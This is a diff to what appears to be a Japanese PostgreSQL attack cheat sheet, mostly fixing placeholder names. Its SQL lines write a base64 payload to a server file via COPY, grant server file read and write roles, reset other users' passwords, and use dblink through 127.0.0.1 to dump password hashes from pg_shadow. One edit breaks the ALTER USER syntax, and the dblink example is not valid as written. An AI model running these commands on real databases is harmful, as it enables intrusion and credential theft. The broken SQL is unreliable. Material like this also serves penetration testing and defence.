@@ -187,7 +187,7 @@ SHOW data_directory;
 ファイルの書き込み
 ```sql
 -- COPYコマンドによる書き込み（改行を含まないワンライナーである必要あり）
-COPY (SELECT convert_from(decode('<BASE64_PAYLOAD>','base64'),'utf-8')) TO '<outpt_path>';
+COPY (SELECT convert_from(decode('<BASE64_PAYLOAD>','base64'),'utf-8')) TO '<output_path>';
 ```
 
 ## ローカルファイル書き込みによるテーブルデータ更新
@@ -252,7 +252,7 @@ GRANT pg_read_server_files TO <username>;
 GRANT pg_write_server_files TO <username>;
 
 -- スーパーユーザーであれば他の非スーパーユーザーのパスワード変更が可能
-ALTER USER user_name WITH PASSWORD '<new_password>';
+ALTER USER <username> WITH <password> '<new_password>';
 ```
 
 SUPERUSER への昇格（ローカル信頼設定の悪用）
@@ -269,5 +269,5 @@ dblink を使用したローカルログイン方法。
 
 - 外部IPからのログインが制限されていても、127.0.0.1 経由で dblink を叩くことでログイン可能な場合がある
 ```sql
-SELECT * FROM dblink('host=127.0.0.1 user=<username> password=<pw> dbname=<database>', 'SELECT usename,passwd from pg_shadow') RETURNS (result TEXT);
+SELECT * FROM dblink('host=127.0.0.1 user=<username> password=<password> dbname=<database>', 'SELECT usename,passwd from pg_shadow') RETURNS (result TEXT);
 ```
